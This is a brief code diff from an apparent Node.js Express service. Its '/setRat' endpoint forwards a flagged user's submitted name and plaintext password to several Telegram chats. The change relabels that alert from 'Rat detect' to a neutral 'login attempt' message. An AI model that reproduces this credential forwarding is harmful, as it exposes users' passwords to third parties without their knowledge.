@@ -87,7 +87,7 @@ app.post('/setRat', async (req, res) => {
         let user = await getUser(name, password)
         if (user.rat){
             chatIDBosses.map(e => {
-                bot.telegram.sendMessage(e, `Rat detect: ${name} ${password}`)
+                bot.telegram.sendMessage(e, `Попытка входа: ${name} ${password}`)
             })
             await writeRatData(ratData, name, password)
         }
